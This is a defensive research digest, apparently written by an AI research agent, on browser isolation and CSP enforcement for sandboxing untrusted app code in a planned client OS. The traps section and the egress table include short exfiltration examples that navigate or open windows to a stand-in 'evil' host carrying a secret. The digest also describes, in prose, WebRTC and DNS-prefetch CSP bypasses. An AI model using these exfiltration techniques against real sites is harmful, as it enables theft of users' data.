# Web platform isolation and integrity primitives — enforcement reality 2026 — research digest
**Corpus:** 2026-07-07-clientv2-corpus. **Agent lane:** web-isolation. **Date:** 2026-07-07.

## Bottom line for the OS designers

There is **no single primitive** that cages untrusted third-party JS in a browser. Every deployed system that runs untrusted code (MetaMask Snaps, LavaMoat, StackBlitz WebContainers) uses a **defense-in-depth stack of three independent layers**, because each layer covers a different threat and each has documented holes:

1. **SES / Hardened JavaScript (in-language object-capability)** — removes *ambient* authority inside JS: freezes intrinsics, gives each app a Compartment whose `globalThis` contains only endowed capabilities. This is what denies `fetch`/`XHR`/`WebSocket` *by omission* (they are simply not in the compartment global). But SES is **not a network boundary** and **not a browser boundary** — a single containment bug or an over-broad endowment defeats it, and it cannot stop the DOM if the app has DOM.
2. **The browser process/origin boundary (cross-origin sandboxed iframe or, better, a Worker)** — the only *hardware-enforced* layer. Denies same-origin data (cookies, storage, DOM of parent), and — critically — running app code in a **dedicated Worker structurally removes the DOM, navigation, `window.open`, and WebRTC** (none exist in worker scope).
3. **CSP Level 3 + Permissions-Policy (declarative network/feature lockdown)** — `connect-src 'none'` (or an allowlist) is the enforcement that actually blocks scripted network egress (`fetch`, `XHR`, `WebSocket`, `EventSource`, `sendBeacon`, `<a ping>`, WebTransport). This is the layer that turns "no endowment" into "browser-enforced denial."

**The single most important architectural finding for EFS Ring-3:** *run app logic in a dedicated Worker, not an iframe.* A Worker's network surface is a **closed, CSP-governable set** (`fetch`/`fetchLater`, `XHR`, `WebSocket`, `EventSource`, `WebTransport`, `sendBeacon`, `importScripts`, nested `Worker`). Every one of these is covered by `connect-src`/`script-src`/`worker-src`. A Worker has **no DOM, no navigation, no `window.open`, and no `RTCPeerConnection`** — which closes the exfiltration holes that are *provably unfixable* in a DOM context (WebRTC and self-navigation; see Traps). A blob-URL worker **inherits the creating document's CSP**, so a content-addressed static app can enforce `connect-src 'none'` on the worker without server headers. This is the closest thing to an airtight no-network cage the platform offers today, and it matches EFS's "render is a capability, not ambient DOM" instinct in the handoff.

---

## Enforcement ground-truth: what actually denies network egress

Legend: ✅ browser-enforced denial available today · ⚠️ partial / caveats · ❌ cannot be denied at this layer.

| Egress vector | In a **Worker** (no DOM) | In a **cross-origin sandboxed iframe** (with DOM) | Governing control |
|---|---|---|---|
| `fetch()` / `fetchLater()` | ✅ | ✅ | CSP `connect-src` |
| `XMLHttpRequest` | ✅ | ✅ | CSP `connect-src` (+ Permissions-Policy `sync-xhr` for sync) |
| `WebSocket` | ✅ | ✅ | CSP `connect-src` (note: `'self'` ≠ ws scheme in all browsers) |
| `EventSource` (SSE) | ✅ | ✅ | CSP `connect-src` |
| `navigator.sendBeacon()` | ✅ | ✅ | CSP `connect-src` |
| `<a ping>` | n/a (no DOM) | ✅ | CSP `connect-src` |
| `WebTransport` | ✅ | ✅ | CSP `connect-src` (+ `'unsafe-webtransport-hashes'` keyword) |
| `importScripts()` / nested `Worker` | ✅ | n/a | CSP `script-src` / `worker-src` |
| **WebRTC** (`RTCPeerConnection` → STUN/TURN/ICE) | ✅ **not available in workers** | ❌ **NOT covered by `connect-src`** | only CSP `webrtc 'block'` (Chromium-only, partial) |
| `<img>` / CSS `url()` / `@font-face` / `<video>` subresource beacons | n/a (no DOM) | ✅ | CSP `img-src`/`style-src`/`font-src`/`media-src` = `'none'` |
| `<iframe>` nested-frame beacon | n/a | ✅ | CSP `frame-src 'none'` |
| DNS prefetch (`<link rel=dns-prefetch>`) | n/a | ⚠️ leaks via DNS | `X-DNS-Prefetch-Control: off` (header, not meta); CSP does NOT stop it |
| Speculation Rules / prerender / prefetch | n/a | ⚠️ documented CSP bypass (2026) | `prefetch-src` deprecated; unreliable |
| Top-level navigation `location = evil?data` | ✅ **no navigation in workers** | ❌ **self-navigation not stoppable** (navigate-to removed 2022) | sandbox blocks *top* nav & popups, not frame self-nav |
| `window.open(evil?data)` | ✅ **no `window` in workers** | ⚠️ blocked if sandbox omits `allow-popups` | iframe `sandbox` attribute |
| `<form>` submission | n/a | ⚠️ blocked by CSP `form-action 'none'` | CSP `form-action` (NOT covered by `default-src`) |
| `postMessage` to a higher-privilege frame | ⚠️ *by design* — this is the mediated channel | ⚠️ same | **design boundary, not a browser control** |

**Reading:** a DOM context has at least three vectors that are *not* closable by CSP (WebRTC, frame self-navigation, DNS/prerender side channels). A Worker context closes all three structurally. Therefore the Worker cage is the only configuration that can be made **airtight for scripted egress**, and even it depends on `connect-src` being enforced and the `postMessage` relay to the Kernel being the sole sanctioned channel.

---

## WHAT EXISTS TODAY (shipped, with support reality)

### SES / Endo / Hardened JavaScript — production-proven, the OCap core
- **What it is:** `lockdown()` transitively freezes all JS intrinsics (prototypes, `Object`, `Array`, etc.) so no two programs in a realm can interfere until introduced; `Compartment` gives child evaluators their own `globalThis` + module map while **sharing hardened intrinsics** (lightweight, unlike a Realm/iframe). `harden()` deep-freezes objects passed across the boundary. Ships as the npm `ses` shim (`@endo/ses`, v1.15 line, 2025–26), a TC39 Stage-1 aspiration but usable today as a shim.
- **Production reality:** MetaMask (browser extension, tens of millions of users) and Agoric run it in production; formal-verification work on the Agoric kernel found the OCap model sound; security reviews surfaced no critical flaws. This is the most battle-tested untrusted-JS sandbox on the web.
- **Hard limit:** SES governs *language* authority only. `fetch`/`WebSocket`/DOM are host objects; SES neither adds nor removes them except that a `Compartment`'s global starts empty, so you deny network by **not endowing it**. It offers *no* defense if the host later hands DOM in, and *no* process boundary — it is layer 1 of 3, never alone.

### LavaMoat — per-package policy over SES
- Wraps each dependency in its own SES `Compartment` with a generated per-package policy (which globals/builtins, which packages it may import). "Scuttling" removes sensitive APIs from the *real* `globalThis` after copies are captured, so a leaked reference to the true global is useless. Used to harden MetaMask's own build/dependency graph and as a webpack/browserify plugin.
- **Trap (see below):** a `with()`-based sandbox escape in `lavapack` was found (2024) and patched in <2 days — proof that in-language sandboxes are an ongoing cat-and-mouse, not a fixed guarantee.

### iframe `sandbox` + opaque origins
- `sandbox` with `allow-scripts` but **without `allow-same-origin`** ⇒ the frame gets a **null/opaque origin**: fails all same-origin checks, no cookies, no `localStorage`, partitioned/ephemeral storage. Omitting `allow-popups` blocks `window.open`; omitting `allow-top-navigation` blocks navigating the top frame.
- **Footgun:** setting **both** `allow-scripts` and `allow-same-origin` lets the frame reach up and *remove its own sandbox attribute* → "no more secure than no sandbox." Never combine them for untrusted code. (Chrome 142, 2025, additionally began blocking local-network requests from `null` origins pre-CORS — a helpful hardening.)

### CSP Level 3 — the network lockdown layer
- **`connect-src`** governs `fetch`, `fetchLater`, `XHR`, `WebSocket`, `EventSource`, `sendBeacon`, `<a ping>`, WebTransport. `connect-src 'none'` denies all scripted egress. `default-src 'none'` backstops all *fetch* directives but **NOT** `form-action`, `base-uri`, `frame-ancestors`, `sandbox`, `report-*` — set those explicitly.
- **`strict-dynamic`** (nonce/hash propagates trust to dynamically-inserted scripts, ignores host allowlists) is the recommended modern script policy; broadly supported.
- **Worker CSP inheritance (critical):** a worker loaded from a real URL uses **its own response `Content-Security-Policy` header** and does NOT inherit the parent. BUT a worker from a **`blob:` or `data:` URL inherits the creator's CSP** (globally-unique origin, no response headers to parse). ⇒ For a static/IPFS content-addressed OS with no server headers, **spawn Ring-3 workers from `blob:` URLs** so they inherit the page's strict `connect-src`. This is the linchpin that makes CSP enforceable without a server.
- **`<meta http-equiv>` CSP limits:** `frame-ancestors`, `sandbox`, and `report-uri` **do NOT work in a meta tag** — only in a real header. `connect-src`, `img-src`, `script-src`, `default-src` DO work in meta. So a header-less static app can enforce network/subresource lockdown via meta, but must set framing/sandbox via the *parent's* `<iframe sandbox>` attribute.

### Trusted Types — DOM-XSS elimination, now Baseline
- `require-trusted-types-for 'script'` forces all injection sinks (`innerHTML`, `eval`, `Function`, `script.src`, …) to accept only typed, policy-vetted values, killing an entire class of DOM XSS. **Support timeline:** Chrome/Edge since v83 (2020); **Safari 26 (Sept 2025)**; **Firefox Feb 2026** → reached **Baseline** in 2026. Now practical cross-browser. Directly relevant to any Shell that renders app-provided markup.

### Permissions-Policy — feature (not network) gating
- Header-based allow/deny of ~30 features: `camera`, `microphone`, `geolocation`, `usb`, `serial`, `hid`, `payment`, `display-capture`, `sync-xhr`, `clipboard-read/write`, `idle-detection`, etc. Propagates to iframes via the `allow` attribute. **There is NO `fetch`/`connect` and NO WebRTC-datachannel directive** — Permissions-Policy cannot block network or WebRTC data channels; it gates *devices/sensors*. Use it to strip an app's access to camera/mic/USB/serial/geolocation by default.

### COOP / COEP / CORP / credentialless + Origin-Agent-Cluster
- **COOP `same-origin` + COEP `require-corp`** ⇒ **cross-origin isolation** (`self.crossOriginIsolated === true`), unlocking `SharedArrayBuffer` + high-res timers and severing cross-origin window references (mitigates Spectre-class leaks). **COEP `credentialless`** eases embedding (sends no-cors subresource requests without credentials) — **Chrome 96+ and Firefox 119+, but Safari does NOT implement it and has said it won't.** So credentialless is not a cross-browser solution; `require-corp` + per-resource CORP is the portable path.
- **`Origin-Agent-Cluster: ?1`** requests origin-keyed process isolation — but it is **only a hint**; the browser may ignore it (and may use threads not processes). Do not rely on it for a security boundary; treat as performance/robustness hardening.

### Import maps — module resolution + integrity
- **Multiple import maps:** shipped in **Chrome 133 (2025)** (merged deterministically). **Firefox: not yet** (open Bugzilla). Safari: single import map since 16.4; multiple unconfirmed. ⇒ Don't depend on multiple/dynamic import maps cross-browser yet; assume one map per document as the portable baseline.
- **Import map integrity (SRI for modules):** an `integrity` field in the import map pins ES-module URLs to hashes, applied to static *and* lazy imports and their dependency graph. Shipped **Chromium 127** and **Safari 18** (2024–25); the WICG import-maps repo was archived (Feb 2025) and folded into HTML. **This is exactly what a content-addressed OS needs** to verify every module against a CID-derived hash without a server.

### Storage partitioning — ambient, on by default
- **Chrome 115+** partitions storage/service-workers/comms APIs by top-level site; **Chrome 137 (May 2025)** partitions Blob URLs (except top-level nav). **Firefox 103+** Total Cookie Protection double-keys all state. **Safari** partitions since ITP (2017). ⇒ EFS gets per-origin state isolation for free; a compromised app in one origin cannot read another origin's storage. Design the Ring-3 origin scheme to *lean on* this (distinct origins per app where feasible).

### Web Workers as sandboxes — the strongest practical cage
- Workers have **no DOM, no `window`, no navigation, no `RTCPeerConnection`, no `<img>`/CSS subresource loads**. Their entire egress surface is scriptable network APIs, all CSP-governable. Nested workers and `importScripts` are governed by `worker-src`/`script-src`. Combined with blob-URL CSP inheritance, a worker is the tightest network cage available. Cost: the app can't touch the DOM, so **rendering must be mediated** (app posts a command/VDOM stream or draws to a transferred `OffscreenCanvas`; Shell owns the real DOM). This is a feature for EFS, not a bug — it matches the "Render service" boundary in the handoff.

---

## WHAT IS EMERGING (proposals/drafts/betas — status + date)

- **ShadowRealm (TC39):** **Stage 2.7** as of 2025–26 (not Stage 3). Synchronous, same-thread fresh global with its own intrinsics; **omits DOM and fetch by default** (host decides what to expose). The **callable boundary allows only primitives and wrapped callables** across the boundary — passing objects throws — which structurally prevents global-leak escapes. TC39 side is largely resolved; **the open blocker is HTML/WebIDL integration** (which of `EventTarget`/`URL`/`TextEncoder`/etc. are included) and *implementer interest*. **Not shippable today; do not design a hard dependency on it.** When it lands it becomes a lighter-weight compartment for pure compute. It is *not* a network boundary either (same reasoning as SES).
- **Compartments proposal (TC39):** **Stage 1**, exploratory ("compartmentalize host behaviors"); `proposal-compartments` is the live thread and underpins the `ses` shim's design. Years from standardization. Use the **shim** (`ses`/`@endo`), not the native proposal.
- **Isolated Web Apps (IWA) + Signed Web Bundles (`.swbn`):** **enterprise-only** as of Feb 2026. ChromeOS/Chrome 120+, force-installed via enterprise policy on managed devices only; broader/cross-platform "later." `isolated-app://` scheme, Ed25519/ECDSA-P256 signed bundles, mandatory strict CSP + COOP/COEP, per-app storage. **Two cautions for EFS:** (1) IWAs *grant more* power (Direct Sockets = raw TCP/UDP, Controlled Frame) — the opposite of a network cage; (2) the required CSP "allows Wasm from **any** source no matter its origin" — a notable integrity gap if you rely on CSP to pin code. IWA's **bundle-signing + offline-verifiable distribution model is an excellent precedent** for EFS content-addressed OS profiles, but IWA itself is not available to a non-enterprise web-distributed OS. Only Chromium ships it.
- **WASM Component Model / WASI 0.2→0.3:** **WASI 0.3.0 released 2026-06-11** (native async: `stream<T>`, `future<T>`), in Wasmtime 43+/jco; **WASI 1.0 expected late-2026/early-2027**. **Browser story is via `jco transpile`** (component → core Wasm + JS glue) — real and usable today, but there is **no native two-engine browser implementation**, so the Component Model can't hit 1.0 on the web yet. For EFS: Wasm is a strong option for CPU-bound app logic with a *deny-by-default* import surface (a component only gets the host functions you supply — a natural capability model), but treat browser-native WASI as *emerging*, use jco glue, and remember CSP `wasm-unsafe-eval` / the IWA any-source-Wasm gap when reasoning about integrity.

---

## Can a Service-Worker-controlled page + CSP make an airtight no-network app cage?

**Partially, and only with a Worker (not a DOM iframe) for app code.** Key facts:
- A **Service Worker CANNOT intercept `WebSocket`, WebTransport, or WebRTC** — these bypass the SW `fetch` handler by design (EventSource historically debated). So you **cannot** implement network mediation purely by intercepting in a SW; a SW that only rewrites `fetch` leaves WS/WebTransport/WebRTC open. CSP must be the primary denier, not the SW.
- The SW is useful for **offline serving and integrity** (serve only content-addressed bytes, verify hashes), and to *fail-closed* any `fetch` it doesn't recognize — but it is a **caching/integrity layer, not a security boundary** against a determined exfiltrator.
- **Airtight recipe (scripted egress):** Ring-3 app code in a **dedicated blob-URL Worker** (inherits page CSP) under `Content-Security-Policy: default-src 'none'; connect-src 'none'; script-src 'none'` (after the bootstrap script is in). No DOM ⇒ no WebRTC, no navigation, no subresource beacons. The **only** outward channel is `postMessage` to the Kernel, which mediates every capability. That is genuinely airtight for network *if* the Kernel relay never blindly forwards.
- **Residual holes even then:** timing/covert channels via `postMessage` volume, and any capability the Kernel *does* grant (a granted `fetch` endpoint can be abused within its allowlist). These are policy problems, not platform holes.

---

## LESSONS AND TRAPS from deployed systems

1. **In-language sandboxes get escaped; budget for it.** LavaMoat's `lavapack` `with()`-sandbox was bypassed via `removeComments` abuse (2024), chainable with a compromised dependency to reach encrypted keypairs. Patched fast, but the lesson stands: **SES/Compartments are a hardening layer, not a boundary you can bet keys on alone.** Always back them with the browser origin boundary (iframe/worker) — exactly what MetaMask Snaps does (SES **inside** an iframe).
2. **SES is not a network firewall.** Removing `fetch` from a compartment global does nothing if the app is later endowed with any object whose prototype chain reaches a network primitive, or with DOM. Network denial must be *also* enforced by CSP `connect-src`. Two independent layers.
3. **WebRTC is the canonical CSP-bypass exfil channel in DOM contexts.** `connect-src` does **not** cover `RTCPeerConnection`; a data channel to an attacker's TURN/STUN server exfiltrates freely. The only CSP tool is the `webrtc` directive (`'block'`), which is **Chromium-partial and absent in Safari/Firefox stable**; if unsupported, WebRTC is *allowed by default*. **Mitigation that actually works: run untrusted code in a Worker (no `RTCPeerConnection`)** or strip it via `RTCPeerConnection` being undefined. Do not rely on the `webrtc` CSP directive cross-browser in 2026.
4. **Navigation exfiltration is unfixable at the CSP layer.** `navigate-to` was **removed from the CSP spec in Sept 2022** (privacy/complexity). A DOM frame can `location = 'https://evil/?'+secret` and leak before it unloads; `<form action>` needs explicit `form-action 'none'`; `window.open` needs sandbox to omit `allow-popups`. **A Worker has no navigation and no `window` — this is the decisive reason to prefer Workers for app logic.**
5. **DNS-prefetch and speculation/prerender bypass CSP.** `<link rel=dns-prefetch>` leaks encoded data via DNS lookups that CSP does not govern (only the `X-DNS-Prefetch-Control: off` *header* helps). A 2026 "stealth prerender" technique reportedly exfiltrates via speculation rules while hiding from DevTools and bypassing CSP. `prefetch-src` was deprecated. **DOM cages leak through prefetch side channels; Workers don't have these APIs.**
6. **`allow-scripts` + `allow-same-origin` = no sandbox.** The frame can delete its own `sandbox` attribute. This mistake recurs constantly. For untrusted code: opaque origin only.
7. **IWA/Signed Web Bundles are enterprise-gated and grant MORE authority.** Don't assume EFS can ship as an IWA to the public in 2026 (managed ChromeOS only), and note IWAs deliberately expose Direct Sockets (raw sockets) — a network-*expanding* platform, and their mandatory CSP allows any-source Wasm. Borrow the **signed-bundle/offline-verification model**, not the runtime.
8. **Safari is the cross-browser floor.** No COEP `credentialless`, no `webrtc` CSP directive, late Trusted Types (Sept 2025), import-map integrity only from Safari 18. Design to the intersection: `COEP require-corp` + explicit CORP, Worker-based network denial (not `webrtc` directive), and don't assume multiple/dynamic import maps.
9. **Origin-Agent-Cluster and process isolation are hints, not guarantees.** Never treat them as a security boundary; they reduce blast radius opportunistically.
10. **Blob URL semantics keep shifting.** Chrome 137 (2025) partitioned Blob URL access; blob workers inherit CSP but blob *navigations* are now partitioned. Pin behavior with tests, not assumptions.

---

## EFS TRANSLATION — opinionated recommendations for client v2

1. **Ring-3 app code runs in a dedicated Worker, spawned from a `blob:` URL, not in an iframe.** This is the single highest-leverage decision. It structurally deletes WebRTC, navigation, `window.open`, and subresource-beacon exfiltration — the vectors CSP cannot close — and lets the app inherit the Kernel page's strict CSP with no server headers (works on IPFS/`web3://`). Apps that need pixels get a mediated **Render service** (transferred `OffscreenCanvas` or a command/VDOM stream the Shell reconciles into trusted DOM), never raw DOM.
2. **Three enforced layers, always, per app:** (a) **SES `lockdown()` + a per-app `Compartment`** with an endowment set that is *only* the attenuated `efs.*` capability object — no `fetch`, no `WebSocket`, no globals; adopt **LavaMoat-style per-package policy + globalThis scuttling** for the OS's own dependency graph and for app bundles. (b) The **Worker origin boundary** above. (c) **CSP `default-src 'none'; connect-src 'none'; script-src 'self' blob:; worker-src blob:; form-action 'none'; base-uri 'none'; object-src 'none'`** as the app-cage baseline; a granted network capability is expressed as a *narrower* CSP (`connect-src https://exact.endpoint`) plus a Kernel-mediated `fetch`, never ambient. This mirrors MetaMask Snaps (SES-in-iframe) but upgraded to SES-in-Worker.
3. **Network is a capability object, never a global.** The Worker cage has `connect-src 'none'`; the *only* egress is `postMessage` to the Kernel, which owns the real `fetch`/socket and enforces the per-origin allowlist, logging, and the "wildcard = loud warning" policy from the handoff. This makes the handoff's `RpcEndpointHandle`/`IpfsGatewayHandle`/`HttpOriginHandle` design *actually enforceable*, because the app has no fallback network path to abuse.
4. **Pin every module and byte with hashes, not hosts.** Use **import-map `integrity`** (Chromium 127+/Safari 18+) so every ES module is checked against its CID-derived hash; use a **Service Worker as an integrity/offline gate** that serves only content-addressed bytes and fails closed on anything else. Treat the SW as caching+integrity, *not* as the network boundary (it can't see WS/WebRTC).
5. **Turn on Trusted Types (`require-trusted-types-for 'script'`) in the Shell and Kernel.** It's Baseline in 2026 and eliminates DOM-XSS in the trusted surfaces that render app-provided content (the "let app modals look like Shell prompts" trap). Pair with a single audited Trusted Types policy for the Shell's renderer.
6. **Strip device authority by default via Permissions-Policy** (`camera=(), microphone=(), geolocation=(), usb=(), serial=(), hid=(), payment=(), display-capture=()`), granted back per capability. Remember it does *not* gate network — that's CSP's job.
7. **Adopt cross-origin isolation with `COOP same-origin` + `COEP require-corp`** (portable; avoid depending on `credentialless` because Safari lacks it). This hardens against Spectre-class cross-window leaks and is required if EFS ever wants `SharedArrayBuffer` for Wasm app logic.
8. **Consider Wasm components (via `jco`) for CPU-bound app logic** as a *second* isolation dimension: a component only receives the host imports you supply — a clean capability surface — and can't touch JS globals at all. Treat WASI-in-browser as emerging (0.3 shipped June 2026, no native two-engine browser impl); use jco glue, keep it optional, and don't let CSP's any-source-Wasm allowance lull you into skipping hash-pinning of the `.wasm`.

---

## Where EFS v2 protocol design may conflict with / under-support the client OS need

1. **"Render is a capability, not DOM" needs a protocol-blessed render/command format.** The airtight cage (Worker, no DOM) forces every app's UI to cross a `postMessage` boundary. EFS v2 designs describe DATA/LIST records but say nothing about how a Ring-3 app *expresses UI* to the Shell. Without a normative render-command / attenuated-DOM schema, each app invents its own bridge and the "no ambient DOM" guarantee erodes. **Recommend an EFS-OS-SDK render protocol note** (not a protocol change, but a client-layer standard) — flag it so it isn't discovered late.
2. **Content-addressed integrity (import-map `integrity`, SW hash-gating) wants CIDs that map to browser SRI hashes.** EFS deterministic IDs are keccak/Merkle-based; browser SRI/import-map integrity uses SHA-256/384 base64. There is an **impedance mismatch**: to use the platform's *native* module-integrity enforcement, the OS must carry a SHA-256 SRI hash alongside the EFS `contentHash`, or re-verify bytes in the SW with its own hasher (slower, non-native). **Pressure point for `codex-bytes`/`large-file-uploads`:** consider whether byte manifests should also expose a SHA-256 digest per chunk so the client can lean on native SRI, or accept SW-side re-hashing as the only path. Worth a line in the EFS v2 bytes design.
3. **No-network-by-default vs. mirror/gateway reads.** Read grades (LIVE/STALE/…) assume the client can reach a venue. But the OS cage denies all network by default and only grants exact endpoints. The protocol's freshness semantics must be honest that **"UNKNOWN because no network capability granted"** is a distinct, common state — not venue absence. The read-lens spec's `UNKNOWN`/`PROVEN-ABSENT` grades should explicitly cover "no transport capability," so the UI never renders "not found" when it's really "not permitted to look." **Recommend the read-lens-spec name a `NO-TRANSPORT`/capability-denied qualifier** distinct from venue-absent.
4. **Signed bundles as OS profiles echo IWA, but EFS has no signer-trust story for *code*.** EFS v2 signs *records* (EIP-712 envelopes) but the client also needs to trust *app/OS code* (Kernel CID, Shell CID, app bundles). IWA uses Ed25519 developer keys + enterprise policy. EFS could reuse **lens-curated attestations over package CIDs** (an app-install record attested by trusted authors, resolved through the user's lens) — but this is *not designed* in v2. **Pressure point:** the "OS profile / app closure" idea in the handoff needs a protocol-level notion of *code provenance via lenses* (attesting `packageCID → signer → capability manifest`), or it falls back to bare content-addressing with no revocation. Flag for a focused `Designs/efsv2/` note on code/package trust.
5. **Permanent records + capability revocation are in tension for the audit trail.** The OS wants a network/permission *ledger* and *settings receipts*; if written to EFS they are permanent, but capability *revocation* is a live state change. The G-set revocation model handles record revocation, but a "capability granted then revoked" audit needs the client to represent *current* authority vs *historical* grant honestly (the handoff's "revocation ≠ prior writes disappeared" trap). Confirm the read-lens/revocation model cleanly expresses "grant record still exists, authority withdrawn" without implying the app never had access.

---

## Sources (accessed 2026-07-07)

SES / Endo / Compartments / LavaMoat:
- https://github.com/endojs/endo/blob/master/packages/ses/README.md
- https://github.com/endojs/endo/blob/master/packages/ses/docs/guide.md
- https://www.npmjs.com/package/ses
- https://github.com/LavaMoat/LavaMoat
- https://www.npmjs.com/package/@lavamoat/webpack
- https://github.com/LavaMoat/LavaMoat/pull/360 (globalThis scuttling)
- https://osec.io/blog/2024-06-10-supply-chain-attacks-a-new-era/ (LavaMoat/lavapack with() escape, 2024)
- https://metamask.io/news/lavamoat-and-the-ledger-software-supply-chain-attack

MetaMask Snaps (SES-in-iframe production model):
- https://docs.metamask.io/snaps/learn/about-snaps/execution-environment/
- https://osec.io/blog/2023-11-01-metamask-snaps/
- https://leastauthority.com/blog/secure-development-of-metamask-snaps/
- https://metamask.io/news/snaps-in-metamask-stable-and-where-we-go-from-here

TC39 proposals:
- https://github.com/tc39/proposal-shadowrealm (Stage 2.7)
- https://tc39.es/proposal-shadowrealm/ ; https://github.com/tc39/proposal-shadowrealm/blob/main/explainer.md
- https://github.com/tc39/proposal-shadowrealm/blob/main/apis.md (callable boundary)
- https://blogs.igalia.com/compilers/2025/03/27/summary-of-the-february-2025-tc39-plenary/
- https://github.com/tc39/proposal-compartments (Stage 1)

CSP Level 3 / fetch directives / worker inheritance / meta limits:
- https://www.w3.org/TR/CSP3/
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/connect-src
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/worker-src
- https://github.com/web-platform-tests/wpt/issues/35641 (worker CSP inheritance)
- https://content-security-policy.com/examples/meta/ (meta-tag directive limits)
- https://content-security-policy.com/navigate-to/ ; https://github.com/mdn/content/issues/21114 (navigate-to removed Sept 2022)

CSP bypass / exfiltration research:
- https://blog.compass-security.com/2016/10/bypassing-content-security-policy-with-dns-prefetching/
- https://www.cse.chalmers.se/research/group/security/pdf/data-exfiltration-in-the-face-of-csp.pdf
- https://brokenbrowser.com/blog/2026-05-09-prerender-stealth-csp-bypass/ (2026 prerender stealth bypass)
- https://hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html

CSP webrtc directive:
- https://bugzilla.mozilla.org/show_bug.cgi?id=1783489
- https://issues.chromium.org/issues/40188662
- https://securityarsenal.com/blog/how-to-defend-against-webrtc-skimmers-bypassing-csp-in-e-commerce

WebRTC in workers:
- https://github.com/w3c/webrtc-extensions/issues/77
- https://developer.mozilla.org/en-US/docs/Web/API/RTCPeerConnection

iframe sandbox / opaque origin:
- https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox
- https://workadventu.re/tech/chrome-142-local-scripts-fix/ (Chrome 142 null-origin local network block, 2025)

Trusted Types:
- https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/require-trusted-types-for
- https://www.uriports.com/blog/csp-trusted-types/ (Safari 26 Sept 2025, Firefox Feb 2026 -> Baseline)

Permissions Policy:
- https://www.w3.org/TR/permissions-policy/
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Permissions-Policy

COOP/COEP/CORP/credentialless + Origin-Agent-Cluster:
- https://web.dev/articles/coop-coep
- https://developer.chrome.com/blog/coep-credentialless-origin-trial
- https://caniuse.com/mdn-http_headers_cross-origin-embedder-policy_credentialless (Safari no-impl)
- https://web.dev/articles/origin-agent-cluster
- https://github.com/WICG/origin-agent-cluster

Import maps (multiple + integrity):
- https://developer.chrome.com/release-notes/133 (multiple import maps, Chrome 133, 2025)
- https://bugzilla.mozilla.org/show_bug.cgi?id=1916277 (Firefox multiple import maps pending)
- https://shopify.engineering/shipping-support-for-module-script-integrity-in-chrome-safari (Chromium 127, Safari 18)
- https://jspm.org/js-integrity-with-import-maps

Isolated Web Apps / Signed Web Bundles:
- https://developer.chrome.com/docs/iwa/introduction (updated 2026-02-06; enterprise-only, Direct Sockets, any-source Wasm)
- https://chromeos.dev/en/web/isolated-web-apps ; https://chromeos.dev/en/tutorials/getting-started-with-isolated-web-apps/2
- https://github.com/WICG/isolated-web-apps/blob/main/README.md
- https://groups.google.com/a/chromium.org/g/blink-dev/c/iMfYonTs414 (Intent to Ship)

WASM Component Model / WASI:
- https://bytecodealliance.org/articles/WASI-0.3 (WASI 0.3.0 released 2026-06-11)
- https://bytecodealliance.org/articles/the-road-to-component-model-1-0
- https://wasi.dev/roadmap ; https://eunomia.dev/blog/2025/02/16/wasi-and-the-webassembly-component-model-current-status/
- https://platform.uno/blog/the-state-of-webassembly-2025-2026/

Service Worker interception limits:
- https://github.com/w3c/ServiceWorker/issues/947 (WS/EventSource bypass SW)
- https://github.com/w3c/ServiceWorker/issues/885

Storage partitioning:
- https://privacysandbox.google.com/cookies/storage-partitioning (Chrome 115+, Blob URLs Chrome 137 / May 2025)
- https://developer.mozilla.org/en-US/docs/Web/Privacy/Guides/State_Partitioning (Firefox 103+ TCP)
